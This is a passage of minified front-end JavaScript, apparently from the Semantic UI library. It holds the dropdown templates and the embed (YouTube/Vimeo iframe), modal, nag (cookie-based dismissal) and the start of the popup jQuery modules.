".dropdown.icon", search: "input.search, .menu > .search > input, .menu input.search", sizer: "> input.sizer", text: "> .text:not(.icon)", unselectable: ".disabled, .filtered" }, className: { active: "active", addition: "addition", animating: "animating", disabled: "disabled", empty: "empty", dropdown: "ui dropdown", filtered: "filtered", hidden: "hidden transition", item: "item", label: "ui label", loading: "loading", menu: "menu", message: "message", multiple: "multiple", placeholder: "default", sizer: "sizer", search: "search", selected: "selected", selection: "selection", upward: "upward", leftward: "left", visible: "visible" } }, e.fn.dropdown.settings.templates = { dropdown: function(t) { var n = t.placeholder || !1,
                        i = (t.values, ""); return i += '<i class="dropdown icon"></i>', t.placeholder ? i += '<div class="default text">' + n + "</div>" : i += '<div class="text"></div>', i += '<div class="menu">', e.each(t.values, function(e, t) { i += t.disabled ? '<div class="disabled item" data-value="' + t.value + '">' + t.name + "</div>" : '<div class="item" data-value="' + t.value + '">' + t.name + "</div>" }), i += "</div>" }, menu: function(t, n) { var i = t[n.values] || {},
                        r = ""; return e.each(i, function(e, t) { var i = t[n.text] ? 'data-text="' + t[n.text] + '"' : "",
                            o = t[n.disabled] ? "disabled " : "";
                        r += '<div class="' + o + 'item" data-value="' + t[n.value] + '"' + i + ">", r += t[n.name], r += "</div>" }), r }, label: function(e, t) { return t + '<i class="delete icon"></i>' }, message: function(e) { return e }, addition: function(e) { return e } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.embed = function(n) { var i, r = e(this),
                    o = r.selector || "",
                    a = (new Date).getTime(),
                    s = [],
                    c = arguments[0],
                    u = "string" == typeof c,
                    l = [].slice.call(arguments, 1); return r.each(function() { var d, f = e.isPlainObject(n) ? e.extend(!0, {}, e.fn.embed.settings, n) : e.extend({}, e.fn.embed.settings),
                        h = f.selector,
                        p = f.className,
                        b = f.sources,
                        m = f.error,
                        g = f.metadata,
                        v = f.namespace,
                        y = f.templates,
                        w = "." + v,
                        x = "module-" + v,
                        S = (e(t), e(this)),
                        _ = S.find(h.placeholder),
                        k = S.find(h.icon),
                        C = S.find(h.embed),
                        A = this,
                        E = S.data(x);
                    d = { initialize: function() { d.debug("Initializing embed"), d.determine.autoplay(), d.create(), d.bind.events(), d.instantiate() }, instantiate: function() { d.verbose("Storing instance of module", d), E = d, S.data(x, d) }, destroy: function() { d.verbose("Destroying previous instance of embed"), d.reset(), S.removeData(x).off(w) }, refresh: function() { d.verbose("Refreshing selector cache"), _ = S.find(h.placeholder), k = S.find(h.icon), C = S.find(h.embed) }, bind: { events: function() { d.has.placeholder() && (d.debug("Adding placeholder events"), S.on("click" + w, h.placeholder, d.createAndShow).on("click" + w, h.icon, d.createAndShow)) } }, create: function() { d.get.placeholder() ? d.createPlaceholder() : d.createAndShow() }, createPlaceholder: function(e) { var t = d.get.icon(),
                                n = d.get.url();
                            d.generate.embed(n);
                            e = e || d.get.placeholder(), S.html(y.placeholder(e, t)), d.debug("Creating placeholder for embed", e, t) }, createEmbed: function(t) { d.refresh(), t = t || d.get.url(), C = e("<div/>").addClass(p.embed).html(d.generate.embed(t)).appendTo(S), f.onCreate.call(A, t), d.debug("Creating embed object", C) }, changeEmbed: function(e) { C.html(d.generate.embed(e)) }, createAndShow: function() { d.createEmbed(), d.show() }, change: function(e, t, n) { d.debug("Changing video to ", e, t, n), S.data(g.source, e).data(g.id, t), n ? S.data(g.url, n) : S.removeData(g.url), d.has.embed() ? d.changeEmbed() : d.create() }, reset: function() { d.debug("Clearing embed and showing placeholder"), d.remove.active(), d.remove.embed(), d.showPlaceholder(), f.onReset.call(A) }, show: function() { d.debug("Showing embed"), d.set.active(), f.onDisplay.call(A) }, hide: function() { d.debug("Hiding embed"), d.showPlaceholder() }, showPlaceholder: function() { d.debug("Showing placeholder image"), d.remove.active(), f.onPlaceholderDisplay.call(A) }, get: { id: function() { return f.id || S.data(g.id) }, placeholder: function() { return f.placeholder || S.data(g.placeholder) }, icon: function() { return f.icon ? f.icon : void 0 !== S.data(g.icon) ? S.data(g.icon) : d.determine.icon() }, source: function(e) { return f.source ? f.source : void 0 !== S.data(g.source) ? S.data(g.source) : d.determine.source() }, type: function() { var e = d.get.source(); return void 0 !== b[e] && b[e].type }, url: function() { return f.url ? f.url : void 0 !== S.data(g.url) ? S.data(g.url) : d.determine.url() } }, determine: { autoplay: function() { d.should.autoplay() && (f.autoplay = !0) }, source: function(t) { var n = !1; return t = t || d.get.url(), t && e.each(b, function(e, i) { if (-1 !== t.search(i.domain)) return n = e, !1 }), n }, icon: function() { var e = d.get.source(); return void 0 !== b[e] && b[e].icon }, url: function() { var e, t = f.id || S.data(g.id),
                                    n = f.source || S.data(g.source); return e = void 0 !== b[n] && b[n].url.replace("{id}", t), e && S.data(g.url, e), e } }, set: { active: function() { S.addClass(p.active) } }, remove: { active: function() { S.removeClass(p.active) }, embed: function() { C.empty() } }, encode: { parameters: function(e) { var t, n = []; for (t in e) n.push(encodeURIComponent(t) + "=" + encodeURIComponent(e[t])); return n.join("&amp;") } }, generate: { embed: function(e) { d.debug("Generating embed html"); var t, n, i = d.get.source(); return e = d.get.url(e), e ? (n = d.generate.parameters(i), t = y.iframe(e, n)) : d.error(m.noURL, S), t }, parameters: function(t, n) { var i = b[t] && void 0 !== b[t].parameters ? b[t].parameters(f) : {}; return n = n || f.parameters, n && (i = e.extend({}, i, n)), i = f.onEmbed(i), d.encode.parameters(i) } }, has: { embed: function() { return C.length > 0 }, placeholder: function() { return f.placeholder || S.data(g.placeholder) } }, should: { autoplay: function() { return "auto" === f.autoplay ? f.placeholder || void 0 !== S.data(g.placeholder) : f.autoplay } }, is: { video: function() { return "video" == d.get.type() } }, setting: function(t, n) { if (d.debug("Changing setting", t, n), e.isPlainObject(t)) e.extend(!0, f, t);
                            else { if (void 0 === n) return f[t];
                                e.isPlainObject(f[t]) ? e.extend(!0, f[t], n) : f[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, d, t);
                            else { if (void 0 === n) return d[t];
                                d[t] = n } }, debug: function() {!f.silent && f.debug && (f.performance ? d.performance.log(arguments) : (d.debug = Function.prototype.bind.call(console.info, console, f.name + ":"), d.debug.apply(console, arguments))) }, verbose: function() {!f.silent && f.verbose && f.debug && (f.performance ? d.performance.log(arguments) : (d.verbose = Function.prototype.bind.call(console.info, console, f.name + ":"), d.verbose.apply(console, arguments))) }, error: function() { f.silent || (d.error = Function.prototype.bind.call(console.error, console, f.name + ":"), d.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                f.performance && (t = (new Date).getTime(), i = a || t, n = t - i, a = t, s.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: A, "Execution Time": n })), clearTimeout(d.performance.timer), d.performance.timer = setTimeout(d.performance.display, 500) }, display: function() { var t = f.name + ":",
                                    n = 0;
                                a = !1, clearTimeout(d.performance.timer), e.each(s, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", o && (t += " '" + o + "'"), r.length > 1 && (t += " (" + r.length + ")"), (void 0 !== console.group || void 0 !== console.table) && s.length > 0 && (console.groupCollapsed(t), console.table ? console.table(s) : e.each(s, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), s = [] } }, invoke: function(t, n, r) { var o, a, s, c = E; return n = n || l, r = A || r, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] ? (a = c[i], !1) : (d.error(m.method, t), !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(r, n) : void 0 !== a && (s = a), e.isArray(i) ? i.push(s) : void 0 !== i ? i = [i, s] : void 0 !== s && (i = s), a } }, u ? (void 0 === E && d.initialize(), d.invoke(c)) : (void 0 !== E && E.invoke("destroy"), d.initialize()) }), void 0 !== i ? i : this }, e.fn.embed.settings = { name: "Embed", namespace: "embed", silent: !1, debug: !1, verbose: !1, performance: !0, icon: !1, source: !1, url: !1, id: !1, autoplay: "auto", color: "#444444", hd: !0, brandedUI: !1, parameters: !1, onDisplay: function() {}, onPlaceholderDisplay: function() {}, onReset: function() {}, onCreate: function(e) {}, onEmbed: function(e) { return e }, metadata: { id: "id", icon: "icon", placeholder: "placeholder", source: "source", url: "url" }, error: { noURL: "No URL specified", method: "The method you called is not defined" }, className: { active: "active", embed: "embed" }, selector: { embed: ".embed", placeholder: ".placeholder", icon: ".icon" }, sources: { youtube: { name: "youtube", type: "video", icon: "video play", domain: "youtube.com", url: "//www.youtube.com/embed/{id}", parameters: function(e) { return { autohide: !e.brandedUI, autoplay: e.autoplay, color: e.color || void 0, hq: e.hd, jsapi: e.api, modestbranding: !e.brandedUI } } }, vimeo: { name: "vimeo", type: "video", icon: "video play", domain: "vimeo.com", url: "//player.vimeo.com/video/{id}", parameters: function(e) { return { api: e.api, autoplay: e.autoplay, byline: e.brandedUI, color: e.color || void 0, portrait: e.brandedUI, title: e.brandedUI } } } }, templates: { iframe: function(e, t) { var n = e; return t && (n += "?" + t), '<iframe src="' + n + '" width="100%" height="100%" frameborder="0" scrolling="no" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>' }, placeholder: function(e, t) { var n = ""; return t && (n += '<i class="' + t + ' icon"></i>'), e && (n += '<img class="placeholder" src="' + e + '">'), n } }, api: !1, onPause: function() {}, onPlay: function() {}, onStop: function() {} } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.modal = function(i) { var r, o = e(this),
                    a = e(t),
                    s = e(n),
                    c = e("body"),
                    u = o.selector || "",
                    l = (new Date).getTime(),
                    d = [],
                    f = arguments[0],
                    h = "string" == typeof f,
                    p = [].slice.call(arguments, 1),
                    b = t.requestAnimationFrame || t.mozRequestAnimationFrame || t.webkitRequestAnimationFrame || t.msRequestAnimationFrame || function(e) { setTimeout(e, 0) }; return o.each(function() { var o, m, g, v, y, w, x, S, _, k = e.isPlainObject(i) ? e.extend(!0, {}, e.fn.modal.settings, i) : e.extend({}, e.fn.modal.settings),
                        C = k.selector,
                        A = k.className,
                        E = k.namespace,
                        T = k.error,
                        M = "." + E,
                        R = "module-" + E,
                        P = e(this),
                        I = e(k.context),
                        D = P.find(C.close),
                        O = this,
                        j = P.data(R),
                        q = !1;
                    _ = { initialize: function() { _.verbose("Initializing dimmer", I), _.create.id(), _.create.dimmer(), _.refreshModals(), _.bind.events(), k.observeChanges && _.observeChanges(), _.instantiate() }, instantiate: function() { _.verbose("Storing instance of modal"), j = _, P.data(R, j) }, create: { dimmer: function() { var t = { debug: k.debug, dimmerName: "modals" },
                                    n = e.extend(!0, t, k.dimmerSettings); if (void 0 === e.fn.dimmer) return void _.error(T.dimmer);
                                _.debug("Creating dimmer"), v = I.dimmer(n), k.detachable ? (_.verbose("Modal is detachable, moving content into dimmer"), v.dimmer("add content", P)) : _.set.undetached(), y = v.dimmer("get dimmer") }, id: function() { x = (Math.random().toString(16) + "000000000").substr(2, 8), w = "." + x, _.verbose("Creating unique id for element", x) } }, destroy: function() { _.verbose("Destroying previous modal"), P.removeData(R).off(M), a.off(w), y.off(w), D.off(M), I.dimmer("destroy") }, observeChanges: function() { "MutationObserver" in t && (S = new MutationObserver(function(e) { _.debug("DOM tree modified, refreshing"), _.refresh() }), S.observe(O, { childList: !0, subtree: !0 }), _.debug("Setting up mutation observer", S)) }, refresh: function() { _.remove.scrolling(), _.cacheSizes(), _.set.screenHeight(), _.set.type(), _.set.position() }, refreshModals: function() { m = P.siblings(C.modal), o = m.add(P) }, attachEvents: function(t, n) { var i = e(t);
                            n = e.isFunction(_[n]) ? _[n] : _.toggle, i.length > 0 ? (_.debug("Attaching modal events to element", t, n), i.off(M).on("click" + M, n)) : _.error(T.notFound, t) }, bind: { events: function() { _.verbose("Attaching events"), P.on("click" + M, C.close, _.event.close).on("click" + M, C.approve, _.event.approve).on("click" + M, C.deny, _.event.deny), a.on("resize" + w, _.event.resize) } }, get: { id: function() { return (Math.random().toString(16) + "000000000").substr(2, 8) } }, event: { approve: function() { if (q || !1 === k.onApprove.call(O, e(this))) return void _.verbose("Approve callback returned false cancelling hide");
                                q = !0, _.hide(function() { q = !1 }) }, deny: function() { if (q || !1 === k.onDeny.call(O, e(this))) return void _.verbose("Deny callback returned false cancelling hide");
                                q = !0, _.hide(function() { q = !1 }) }, close: function() { _.hide() }, click: function(t) { var i = e(t.target),
                                    r = i.closest(C.modal).length > 0,
                                    o = e.contains(n.documentElement, t.target);!r && o && (_.debug("Dimmer clicked, hiding all modals"), _.is.active() && (_.remove.clickaway(), k.allowMultiple ? _.hide() : _.hideAll())) }, debounce: function(e, t) { clearTimeout(_.timer), _.timer = setTimeout(e, t) }, keyboard: function(e) { 27 == e.which && (k.closable ? (_.debug("Escape key pressed hiding modal"), _.hide()) : _.debug("Escape key pressed, but closable is set to false"), e.preventDefault()) }, resize: function() { v.dimmer("is active") && (_.is.animating() || _.is.active()) && b(_.refresh) } }, toggle: function() { _.is.active() || _.is.animating() ? _.hide() : _.show() }, show: function(t) { t = e.isFunction(t) ? t : function() {}, _.refreshModals(), _.set.dimmerSettings(), _.showModal(t) }, hide: function(t) { t = e.isFunction(t) ? t : function() {}, _.refreshModals(), _.hideModal(t) }, showModal: function(t) { t = e.isFunction(t) ? t : function() {}, _.is.animating() || !_.is.active() ? (_.showDimmer(), _.cacheSizes(), _.set.position(), _.set.screenHeight(), _.set.type(), _.set.clickaway(), !k.allowMultiple && _.others.active() ? _.hideOthers(_.showModal) : (k.allowMultiple && k.detachable && P.detach().appendTo(y), k.onShow.call(O), k.transition && void 0 !== e.fn.transition && P.transition("is supported") ? (_.debug("Showing modal with css animations"), P.transition({ debug: k.debug, animation: k.transition + " in", queue: k.queue, duration: k.duration, useFailSafe: !0, onComplete: function() { k.onVisible.apply(O), k.keyboardShortcuts && _.add.keyboardShortcuts(), _.save.focus(), _.set.active(), k.autofocus && _.set.autofocus(), t() } })) : _.error(T.noTransition))) : _.debug("Modal is already visible") }, hideModal: function(t, n) { if (t = e.isFunction(t) ? t : function() {}, _.debug("Hiding modal"), !1 === k.onHide.call(O, e(this))) return void _.verbose("Hide callback returned false cancelling hide");
                            (_.is.animating() || _.is.active()) && (k.transition && void 0 !== e.fn.transition && P.transition("is supported") ? (_.remove.active(), P.transition({ debug: k.debug, animation: k.transition + " out", queue: k.queue, duration: k.duration, useFailSafe: !0, onStart: function() { _.others.active() || n || _.hideDimmer(), k.keyboardShortcuts && _.remove.keyboardShortcuts() }, onComplete: function() { k.onHidden.call(O), _.restore.focus(), t() } })) : _.error(T.noTransition)) }, showDimmer: function() { v.dimmer("is animating") || !v.dimmer("is active") ? (_.debug("Showing dimmer"), v.dimmer("show")) : _.debug("Dimmer already visible") }, hideDimmer: function() { if (!v.dimmer("is animating") && !v.dimmer("is active")) return void _.debug("Dimmer is not visible cannot hide");
                            v.dimmer("hide", function() { _.remove.clickaway(), _.remove.screenHeight() }) }, hideAll: function(t) { var n = o.filter("." + A.active + ", ." + A.animating);
                            t = e.isFunction(t) ? t : function() {}, n.length > 0 && (_.debug("Hiding all visible modals"), _.hideDimmer(), n.modal("hide modal", t)) }, hideOthers: function(t) { var n = m.filter("." + A.active + ", ." + A.animating);
                            t = e.isFunction(t) ? t : function() {}, n.length > 0 && (_.debug("Hiding other modals", m), n.modal("hide modal", t, !0)) }, others: { active: function() { return m.filter("." + A.active).length > 0 }, animating: function() { return m.filter("." + A.animating).length > 0 } }, add: { keyboardShortcuts: function() { _.verbose("Adding keyboard shortcuts"), s.on("keyup" + M, _.event.keyboard) } }, save: { focus: function() { g = e(n.activeElement).blur() } }, restore: { focus: function() { g && g.length > 0 && g.focus() } }, remove: { active: function() { P.removeClass(A.active) }, clickaway: function() { k.closable && y.off("click" + w) }, bodyStyle: function() { "" === c.attr("style") && (_.verbose("Removing style attribute"), c.removeAttr("style")) }, screenHeight: function() { _.debug("Removing page height"), c.css("height", "") }, keyboardShortcuts: function() { _.verbose("Removing keyboard shortcuts"), s.off("keyup" + M) }, scrolling: function() { v.removeClass(A.scrolling), P.removeClass(A.scrolling) } }, cacheSizes: function() { P.addClass(A.loading); var i = P.prop("scrollHeight"),
                                r = P.outerHeight();
                            void 0 !== _.cache && 0 === r || (_.cache = { pageHeight: e(n).outerHeight(), height: r + k.offset, scrollHeight: i + k.offset, contextHeight: "body" == k.context ? e(t).height() : v.height() }, _.cache.topOffset = -_.cache.height / 2), P.removeClass(A.loading), _.debug("Caching modal and container sizes", _.cache) }, can: { fit: function() { var e = _.cache.contextHeight,
                                    t = _.cache.contextHeight / 2,
                                    n = _.cache.topOffset,
                                    i = _.cache.scrollHeight,
                                    r = _.cache.height,
                                    o = k.padding,
                                    a = t + n; return i > r ? a + i + o < e : r + 2 * o < e } }, is: { active: function() { return P.hasClass(A.active) }, animating: function() { return P.transition("is supported") ? P.transition("is animating") : P.is(":visible") }, scrolling: function() { return v.hasClass(A.scrolling) }, modernBrowser: function() { return !(t.ActiveXObject || "ActiveXObject" in t) } }, set: { autofocus: function() { var e = P.find("[tabindex], :input").filter(":visible"),
                                    t = e.filter("[autofocus]"),
                                    n = t.length > 0 ? t.first() : e.first();
                                n.length > 0 && n.focus() }, clickaway: function() { k.closable && y.on("click" + w, _.event.click) }, dimmerSettings: function() { if (void 0 === e.fn.dimmer) return void _.error(T.dimmer); var t = { debug: k.debug, dimmerName: "modals", variation: !1, closable: "auto", duration: { show: k.duration, hide: k.duration } },
                                    n = e.extend(!0, t, k.dimmerSettings);
                                k.inverted ? (n.variation = void 0 !== n.variation ? n.variation + " inverted" : "inverted", y.addClass(A.inverted)) : y.removeClass(A.inverted), k.blurring ? v.addClass(A.blurring) : v.removeClass(A.blurring), I.dimmer("setting", n) }, screenHeight: function() { _.can.fit() ? c.css("height", "") : (_.debug("Modal is taller than page content, resizing page height"), c.css("height", _.cache.height + 2 * k.padding)) }, active: function() { P.addClass(A.active) }, scrolling: function() { v.addClass(A.scrolling), P.addClass(A.scrolling) }, type: function() { _.can.fit() ? (_.verbose("Modal fits on screen"), _.others.active() || _.others.animating() || _.remove.scrolling()) : (_.verbose("Modal cannot fit on screen setting to scrolling"), _.set.scrolling()) }, position: function() { _.verbose("Centering modal on page", _.cache), _.can.fit() ? P.css({ top: "", marginTop: _.cache.topOffset }) : P.css({ marginTop: "", top: s.scrollTop() }) }, undetached: function() { v.addClass(A.undetached) } }, setting: function(t, n) { if (_.debug("Changing setting", t, n), e.isPlainObject(t)) e.extend(!0, k, t);
                            else { if (void 0 === n) return k[t];
                                e.isPlainObject(k[t]) ? e.extend(!0, k[t], n) : k[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, _, t);
                            else { if (void 0 === n) return _[t];
                                _[t] = n } }, debug: function() {!k.silent && k.debug && (k.performance ? _.performance.log(arguments) : (_.debug = Function.prototype.bind.call(console.info, console, k.name + ":"), _.debug.apply(console, arguments))) }, verbose: function() {!k.silent && k.verbose && k.debug && (k.performance ? _.performance.log(arguments) : (_.verbose = Function.prototype.bind.call(console.info, console, k.name + ":"), _.verbose.apply(console, arguments))) }, error: function() { k.silent || (_.error = Function.prototype.bind.call(console.error, console, k.name + ":"), _.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                k.performance && (t = (new Date).getTime(), i = l || t, n = t - i, l = t, d.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: O, "Execution Time": n })), clearTimeout(_.performance.timer), _.performance.timer = setTimeout(_.performance.display, 500) }, display: function() { var t = k.name + ":",
                                    n = 0;
                                l = !1, clearTimeout(_.performance.timer), e.each(d, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", u && (t += " '" + u + "'"), (void 0 !== console.group || void 0 !== console.table) && d.length > 0 && (console.groupCollapsed(t), console.table ? console.table(d) : e.each(d, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), d = [] } }, invoke: function(t, n, i) { var o, a, s, c = j; return n = n || p, i = O || i, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] && (a = c[i], !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(i, n) : void 0 !== a && (s = a), e.isArray(r) ? r.push(s) : void 0 !== r ? r = [r, s] : void 0 !== s && (r = s), a } }, h ? (void 0 === j && _.initialize(), _.invoke(f)) : (void 0 !== j && j.invoke("destroy"), _.initialize()) }), void 0 !== r ? r : this }, e.fn.modal.settings = { name: "Modal", namespace: "modal", silent: !1, debug: !1, verbose: !1, performance: !0, observeChanges: !1, allowMultiple: !1, detachable: !0, closable: !0, autofocus: !0, inverted: !1, blurring: !1, dimmerSettings: { closable: !1, useCSS: !0 }, keyboardShortcuts: !0, context: "body", queue: !1, duration: 500, offset: 0, transition: "scale", padding: 50, onShow: function() {}, onVisible: function() {}, onHide: function() { return !0 }, onHidden: function() {}, onApprove: function() { return !0 }, onDeny: function() { return !0 }, selector: { close: "> .close", approve: ".actions .positive, .actions .approve, .actions .ok", deny: ".actions .negative, .actions .deny, .actions .cancel", modal: ".ui.modal" }, error: { dimmer: "UI Dimmer, a required component is not included in this page", method: "The method you called is not defined.", notFound: "The element you specified could not be found" }, className: { active: "active", animating: "animating", blurring: "blurring", inverted: "inverted", loading: "loading", scrolling: "scrolling", undetached: "undetached" } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.nag = function(n) { var i, r = e(this),
                    o = r.selector || "",
                    a = (new Date).getTime(),
                    s = [],
                    c = arguments[0],
                    u = "string" == typeof c,
                    l = [].slice.call(arguments, 1); return r.each(function() { var r, d = e.isPlainObject(n) ? e.extend(!0, {}, e.fn.nag.settings, n) : e.extend({}, e.fn.nag.settings),
                        f = (d.className, d.selector),
                        h = d.error,
                        p = d.namespace,
                        b = "." + p,
                        m = p + "-module",
                        g = e(this),
                        v = (g.find(f.close), e(d.context ? d.context : "body")),
                        y = this,
                        w = g.data(m);
                    t.requestAnimationFrame || t.mozRequestAnimationFrame || t.webkitRequestAnimationFrame || t.msRequestAnimationFrame;
                    r = { initialize: function() { r.verbose("Initializing element"), g.on("click" + b, f.close, r.dismiss).data(m, r), d.detachable && g.parent()[0] !== v[0] && g.detach().prependTo(v), d.displayTime > 0 && setTimeout(r.hide, d.displayTime), r.show() }, destroy: function() { r.verbose("Destroying instance"), g.removeData(m).off(b) }, show: function() { r.should.show() && !g.is(":visible") && (r.debug("Showing nag", d.animation.show), "fade" == d.animation.show ? g.fadeIn(d.duration, d.easing) : g.slideDown(d.duration, d.easing)) }, hide: function() { r.debug("Showing nag", d.animation.hide), "fade" == d.animation.show ? g.fadeIn(d.duration, d.easing) : g.slideUp(d.duration, d.easing) }, onHide: function() { r.debug("Removing nag", d.animation.hide), g.remove(), d.onHide && d.onHide() }, dismiss: function(e) { d.storageMethod && r.storage.set(d.key, d.value), r.hide(), e.stopImmediatePropagation(), e.preventDefault() }, should: { show: function() { return d.persist ? (r.debug("Persistent nag is set, can show nag"), !0) : r.storage.get(d.key) != d.value.toString() ? (r.debug("Stored value is not set, can show nag", r.storage.get(d.key)), !0) : (r.debug("Stored value is set, cannot show nag", r.storage.get(d.key)), !1) } }, get: { storageOptions: function() { var e = {}; return d.expires && (e.expires = d.expires), d.domain && (e.domain = d.domain), d.path && (e.path = d.path), e } }, clear: function() { r.storage.remove(d.key) }, storage: { set: function(n, i) { var o = r.get.storageOptions(); if ("localstorage" == d.storageMethod && void 0 !== t.localStorage) t.localStorage.setItem(n, i), r.debug("Value stored using local storage", n, i);
                                else if ("sessionstorage" == d.storageMethod && void 0 !== t.sessionStorage) t.sessionStorage.setItem(n, i), r.debug("Value stored using session storage", n, i);
                                else { if (void 0 === e.cookie) return void r.error(h.noCookieStorage);
                                    e.cookie(n, i, o), r.debug("Value stored using cookie", n, i, o) } }, get: function(n, i) { var o; return "localstorage" == d.storageMethod && void 0 !== t.localStorage ? o = t.localStorage.getItem(n) : "sessionstorage" == d.storageMethod && void 0 !== t.sessionStorage ? o = t.sessionStorage.getItem(n) : void 0 !== e.cookie ? o = e.cookie(n) : r.error(h.noCookieStorage), "undefined" != o && "null" != o && void 0 !== o && null !== o || (o = void 0), o }, remove: function(n) { var i = r.get.storageOptions(); "localstorage" == d.storageMethod && void 0 !== t.localStorage ? t.localStorage.removeItem(n) : "sessionstorage" == d.storageMethod && void 0 !== t.sessionStorage ? t.sessionStorage.removeItem(n) : void 0 !== e.cookie ? e.removeCookie(n, i) : r.error(h.noStorage) } }, setting: function(t, n) { if (r.debug("Changing setting", t, n), e.isPlainObject(t)) e.extend(!0, d, t);
                            else { if (void 0 === n) return d[t];
                                e.isPlainObject(d[t]) ? e.extend(!0, d[t], n) : d[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, r, t);
                            else { if (void 0 === n) return r[t];
                                r[t] = n } }, debug: function() {!d.silent && d.debug && (d.performance ? r.performance.log(arguments) : (r.debug = Function.prototype.bind.call(console.info, console, d.name + ":"), r.debug.apply(console, arguments))) }, verbose: function() {!d.silent && d.verbose && d.debug && (d.performance ? r.performance.log(arguments) : (r.verbose = Function.prototype.bind.call(console.info, console, d.name + ":"), r.verbose.apply(console, arguments))) }, error: function() { d.silent || (r.error = Function.prototype.bind.call(console.error, console, d.name + ":"), r.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                d.performance && (t = (new Date).getTime(), i = a || t, n = t - i, a = t, s.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: y, "Execution Time": n })), clearTimeout(r.performance.timer), r.performance.timer = setTimeout(r.performance.display, 500) }, display: function() { var t = d.name + ":",
                                    n = 0;
                                a = !1, clearTimeout(r.performance.timer), e.each(s, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", o && (t += " '" + o + "'"), (void 0 !== console.group || void 0 !== console.table) && s.length > 0 && (console.groupCollapsed(t), console.table ? console.table(s) : e.each(s, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), s = [] } }, invoke: function(t, n, o) { var a, s, c, u = w; return n = n || l, o = y || o, "string" == typeof t && void 0 !== u && (t = t.split(/[\. ]/), a = t.length - 1, e.each(t, function(n, i) { var o = n != a ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(u[o]) && n != a) u = u[o];
                                else { if (void 0 !== u[o]) return s = u[o], !1; if (!e.isPlainObject(u[i]) || n == a) return void 0 !== u[i] ? (s = u[i], !1) : (r.error(h.method, t), !1);
                                    u = u[i] } })), e.isFunction(s) ? c = s.apply(o, n) : void 0 !== s && (c = s), e.isArray(i) ? i.push(c) : void 0 !== i ? i = [i, c] : void 0 !== c && (i = c), s } }, u ? (void 0 === w && r.initialize(), r.invoke(c)) : (void 0 !== w && w.invoke("destroy"), r.initialize()) }), void 0 !== i ? i : this }, e.fn.nag.settings = { name: "Nag", silent: !1, debug: !1, verbose: !1, performance: !0, namespace: "Nag", persist: !1, displayTime: 0, animation: { show: "slide", hide: "slide" }, context: !1, detachable: !1, expires: 30, domain: !1, path: "/", storageMethod: "cookie", key: "nag", value: "dismiss", error: { noCookieStorage: "$.cookie is not included. A storage solution is required.", noStorage: "Neither $.cookie or store is defined. A storage solution is required for storing state", method: "The method you called is not defined." }, className: { bottom: "bottom", fixed: "fixed" }, selector: { close: ".close.icon" }, speed: 500, easing: "easeOutQuad", onHide: function() {} }, e.extend(e.easing, { easeOutQuad: function(e, t, n, i, r) { return -i * (t /= r) * (t - 2) + n } }) }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.popup = function(i) { var r, o = e(this),
                    a = e(n),
                    s = e(t),
                    c = e("body"),
                    u = o.selector || "",
                    l = (new Date).getTime(),
                    d = [],
                    f = arguments[0],
                    h = "string" == typeof f,
                    p = [].slice.call(arguments, 1); return o.each(function() { var o, b, m, g, v, y, w = e.isPlainObject(i) ? e.extend(!0, {}, e.fn.popup.settings, i) : e.extend({}, e.fn.popup.settings),
                        x = w.selector,
                        S = w.className,
                        _ = w.error,
                        k = w.metadata,
                        C = w.namespace,
                        A = "." + w.namespace,
                        E = "module-" + C,
                        T = e(this),
                        M = e(w.context),
                        R = e(w.scrollContext),
                        P = e(w.boundary),
                        I = w.target ? e(w.target) : T,
                        D = 0,
                        O = !1,
                        j = !1,
                        q = this,
                        B = T.data(E);
